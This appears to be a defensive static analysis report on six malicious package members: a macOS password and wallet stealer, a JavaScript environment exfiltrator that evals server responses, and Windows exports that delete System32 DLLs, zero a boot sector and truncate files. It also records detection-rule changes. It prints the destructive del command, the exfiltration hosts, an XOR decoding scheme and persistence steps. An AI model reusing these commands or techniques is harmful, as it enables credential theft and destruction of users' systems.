method: Static byte/source analysis, rizin disassembly and manual XOR/hex reconstruction; specimen code was never executed. atomscan slow/no-update/no-follow and cleave facts collected for all six members and all three archives.
scope: Six stranded members judged individually; confirmed parent archive convictions were not rejudged or remarked.
count_method: Unique trait IDs per member; archive totals are the union of IDs across analyzed archive units. Hostile=crit 5, suspicious=crit 4.
shared_rule_change: Only notes-theft was modified: its old complete-path reference remains one alternative of a neutral path-reference composite; a container plus database-filename alternative accommodates separately assembled paths. No matcher or severity was narrowed, weakened or deleted.

tests.new_native_controls: 4 encrypted-source variants passed; original wallet profile matches, removed masked prompt/read/store alternatives do not
tests.notes_retention: The previous complete Notes pathname and split container/database references both match; a filename alone does not establish Notes collection.

source_to_sink_limit: The new Firefox, desktop-wallet and personal-file composites are explicitly same-file acquisition profiles. They do not prove arbitrary variable data flow, decryption, successful network transfer, or that every named store exists.
dispatcher_limit: osinthell index.js imports all a-z exports and calls them from sorgu(userId), not on require. Its j.js contains a synchronous infinite allocation loop, blocking the ordinary route to later p/t/v exports if that loop is entered; f precedes j. The listed members still expose independently callable destructive actions.
model_limit: Atomscan reports feature spec v18 versus expected v21. Classification is recorded separately from the static verdict; no score-tuning rules or duplicates were added.

members.name: Installer
members.marker_note: Installer stealer: phishes passwords, copies secrets, uploads ZIP
members.identity: Universal Mach-O encrypted AppleScript password and data stealer, packaged as Installer.app
execution: ARM64 entry0 constructs the decrypted std::string and passes c_str() to system at 0x1000006b8; the x86-64 slice implements the same handoff.

The 37077 encrypted bytes at fat offsets 0x4c90 and 0x14de0 are identical. Decode each byte by XOR with the low byte of state 0x11667, updating state to uint32(state*0x3785) modulo 35999 (09:59:59). The resulting command runs osascript -e and a constructed AppleScript.

Main handler reads ~/.pwd, validates with dscl . authonly, and otherwise repeats a masked Installation/device-password dialog until validation. It caches the password and stages it with the collected files.

Reachable handlers enumerate Chromium profiles, copy Login Data/Web Data/Cookies and extension stores; collect Gecko logins.json/key4.db/cookies.sqlite and MetaMask storage; recursively copy desktop-wallet directories and the login keychain database.

Finder automation duplicates Safari cookies, Notes databases/attachments, a UUID Keychains folder, and extension-selected Desktop/Documents files. A fallback reads every Notes account and note body through Notes properties.
ditto archives a random /tmp collection directory to /tmp/out.zip; curl POSTs that archive with configured campaign/user headers to charge0x.at/log. Cleanup removes both directory and ZIP.

If Ledger Live is installed, a helper downloads its replacement archive, kills Ledger Live, uses the captured password with sudo to remove the installed app, and unzips the replacement into /Applications.

Another helper fetches command text, inserts it into bash -c ProgramArguments in a KeepAlive/RunAtLoad LaunchDaemon, then copies and bootstraps it using sudo. The plist UserName is the current user, so root execution of the downloaded command is not established. If bootstrap fails, the command is passed to nohup with output redirected.
members.context: No victim history or remote payload is available. Phishing, secret-store collection, configured export, wallet replacement and persistence establish malicious intent without runtime success. The enclosing postinstall disables Gatekeeper and removes quarantine; those parent actions were not attributed to the member bytes.

members.name: writer
members.marker_note: parser-session writer: hidden environment POST and response eval
members.identity: parser-session 1.1.9 src/lib/writer.js: concealed Axios environment exporter and response evaluator in a copied logging-library layout
execution: Module code imports os and ../package.json, then constructs data from all process.env properties, subModuleVersion, OS platform, hostname, username and noninternal IPv4-interface MACs.

g decodes hexadecimal pairs with parseInt(...,16) and String.fromCharCode. Its table resolves to require, axios, post, https://log-server-lovat.vercel.app/api/ipcheck/703, headers, x-secret-header, secret, then.

The exported arrow function calls require(hl[1])[[hl[2]]](hl[3], data, options)[[hl[7]]](r => eval(r.data)).catch(() => {}). Single-element array property keys coerce to post and then. Invoking the export sends the report and evaluates returned JavaScript; rejection errors are discarded.
members.context: This is unrelated to session parsing/log writing. The supplied layout lacks src/package.json, which ../package.json resolves to, and the main entry requires an absent .pnpm/httpreslog path rather than this local writer; its postinstall script is also absent. These defects prevent claiming successful package execution, not the malicious implementation or intended export/evaluation.
members.classifier_disagreement: ML remains suspicious despite malicious implementation and hostile findings

members.name: v
members.marker_note: osinthell v.js: silently deletes Windows System32 DLLs
members.identity: osinthell 1.6.9 v.js: exported System32 DLL deletion action
execution: Requiring this member defines an export; invocation calls child_process.execSync('del /F /S /Q C:\\Windows\\System32\\*.dll', {shell:true,stdio:'ignore'}) inside an empty catch.
The command forcefully, recursively and quietly targets system DLLs. Locked files and Windows access controls can prevent effects.
members.context: The fixed system target, indiscriminate DLL wildcard, silent streams and ignored errors have no useful utility purpose in this export. No successful deletion or elevation is assumed.
members.coverage_goal: No additional distinct hostile action was found in this member after tracing every export statement. All destructive effects already have hostile coverage. v has one DLL-deletion action; f one boot-sector overwrite plus a neutral repair command; t one recovery-sabotage action; p one root-truncation action covered by two retained hostile observations. More hostile traits would duplicate these effects or invent behaviors; no matcher limitation prevents their existing coverage.

members.name: f
members.marker_note: osinthell f.js: overwrites physical-drive boot sector with zeros
members.identity: osinthell 1.6.9 f.js: exported physical-disk boot-sector zeroing action
execution: Invocation opens \\.\PhysicalDrive0 in r+ mode, creates a 512-byte zero Buffer, writes that buffer to the same handle at offset zero, and closes the descriptor; exceptions are ignored.
A separate try invokes bootrec /fixmbr silently. This repair command alone is dual use; it does not negate the earlier destruction of the whole first sector, including partition information.
members.context: The silent, hardcoded, zero-argument destructive disk action tips the individual verdict. Administrator access and successful raw-disk opening are not established. No whole-disk erase is claimed.

members.name: p
members.marker_note: osinthell p.js: empties files across Windows drive roots
members.identity: osinthell 1.6.9 p.js: exported drive-root file truncator
execution: Invocation loops over C:, D:, E: and F: roots, lists each directory, joins each entry to that same root, checks statSync(full).isFile(), and calls writeFileSync(full,'') with default truncating mode.
It skips directories rather than recursing. Nested catches discard errors at the file, directory and action levels.

loss_investigation.initial_difference: Initial direct Mach-O output loses 28 low/notable IDs, including aliases and an x64-specific transform observation; the archive output loses only the x64-specific transform. No hostile or suspicious ID was lost.
loss_investigation.controlled_baseline: A fresh scan against git archive HEAD, with CLEAVE_SKIP_CACHE=1, yields 7 hostile, 9 suspicious and 159 notable traits. The edited scan retains every one of these IDs and adds 3 hostile, 1 suspicious and 7 notable IDs. The initial extra outputs are not reproduced by the current fresh baseline.
loss_investigation.per_slice_check: Both original thin slices were independently scanned. The x64 helper-state-XOR trait fires on x64; its ARM64 counterpart fires on ARM64. Both slices retain the 10 hostile acquisition/exfiltration/persistence findings. Architecture-selection/output variation is not a rule deletion.
